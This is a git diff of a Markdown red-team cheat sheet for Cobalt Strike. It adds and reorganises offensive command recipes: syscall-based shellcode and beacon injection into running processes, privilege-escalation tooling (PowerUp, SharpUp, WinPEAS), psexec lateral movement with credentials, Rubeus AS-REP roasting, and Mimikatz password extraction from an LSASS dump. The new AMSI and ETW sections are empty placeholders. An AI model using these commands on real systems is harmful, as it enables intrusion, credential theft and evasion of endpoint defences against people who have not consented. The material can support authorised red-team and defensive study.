@@ -1,7 +1,19 @@
 # Cobalt Strike Red Team Cheat Sheet
 
 ## Overview
-- [Domain Enumeration](https://github.com/wsummerhill/CobaltStrike_RedTeam_CheatSheet#domain-enumeration)
+- [Malleable C2 Profiles](#malleable-c2-profiles)
+- [Domain Enumeration](#domain-enumeration)
+- [Local Privilege Escalation](#local-privilege-escalation)
+- [Lateral Movement](#lateral-movement)
+- [Domain Privilege Escalation](#domain-privilege-escalation)
+- [Defense Evasion](#defense-evasion)
+- [Exploitation](#exploitation)
+- [Exfiltration - Password Attacks](#exfiltration---password-attacks)
+- [Persistence](#persistence)
+- [Cobalt Strike BOFs](#cobalt-strike-bofs)
+- [References](#references)
+
+-----------------------------------------------------------------------------------------
 
 ## Malleable C2 Profiles
 
@@ -58,6 +70,7 @@ execute-assembly SharpShares.exe /ldap:all /filter:sysvol,netlogon,ipc$,print$
 
 -----------------------------------------------------------------------------------------
 ## Local Privilege Escalation
+
 ### [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) - PowerSploit module
 ```
 powershell-import --> PowerUp.ps1
@@ -67,8 +80,14 @@ powerpick Invoke-AllChecks | Out-File -Encoding ASCII PowerUp-checks.txt
 ### [SharpUp](https://github.com/GhostPack/SharpUp) - .NET port of PowerUp
 ```
 # Run all checks automatically - output to console
-execute-assembly C:\SharpUp.exe
+execute-assembly C:\SharpUp.exe audit
+
+# Run an individual check
+execute-assembly SharpUp.exe HijackablePaths 
 ```
+
+### [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) - Windows Privilege Escalation Awesome Script<br>
+```execute-assembly winpeas.exe #run all checks```<br>
 
 ### [SeatBelt](https://github.com/GhostPack/Seatbelt) - .NET tool by GhostPack  
 GREAT tool to query a local system to gather system/user/remote/misc data
@@ -209,18 +228,6 @@ execute-assembly SharpExec.exe -m=psexec -i=IPADDRESS -u=USER -p=PASSWORD -d=DOM
 ```
 
 ------------------------------------------------------------------------------------------
-## Local Privilege Escalation
-
-[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe) - Windows Privilege Escalation Awesome Script<br>
-```execute-assembly winpeas.exe #run all checks```<br>
-
-[SharpUp](https://github.com/GhostPack/SharpUp) - SharpUp - GhostPack CSharp tool<br>
-```
-execute-assembly SharpUp.exe audit # run all checks
-execute-assembly SharpUp.exe HijackablePaths # run individual check
-```
-
-------------------------------------------------------------------------------------------
 ## Domain Privilege Escalation
 ### GPP Passwords
 [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) PowerSploit module
@@ -305,18 +312,34 @@ execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfil
 ------------------------------------------------------------------------------------------
 ## Defense Evasion
 
-### Shellcode injection
+### Shellcode injection techniques
 Several methods here within Cobalt Strike or using BOFs
 ```
-# Spawn a beacon into an existing process
+# Spawn a beacon into an existing process 
 inject <PID> <x86|x64> HTTPSLISTENER
 
 # Inject raw shellcode into an existing process
 # Create shellcode: Cobbalt Strike --> Attacks --> Packages --> Windows Executable (S) --> Output = Raw --> Creates "beacon.bin" file
 shinect <PID> <x86|x64> C:\beacon.bin
 
-# Shellcode injection using Windows syscalls with [BOF script](https://github.com/ajpc500/BOFs)
+# Shellcode injection methods using Windows syscalls with [BOFs script](https://github.com/ajpc500/BOFs)
+syscalls_inject <PID> <listener_name>
 syscalls_shinject <PID> C:\beacon.bin
+static_syscalls_inject <PID> <listener_name>
+static_syscalls_shinject <PID> C:\beacon.bin
+syscalls_shspawn C:\beacon.bin
+```
+
+### AMSI
+Test
+```
+
+```
+
+### ETW
+Test
+```
+
 ```
 
 ------------------------------------------------------------------------------------------
@@ -399,7 +422,6 @@ Extracting passwords/hashes offline from LSASS dump using Mimikatz (**ON YOUR OW
 ```
 mimikatz.exe log "privilege::debug" "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords /all" "sekurlsa::wdigest" exit (Run on your local box)
 ```
-
 
 ### SAM database dump 
 
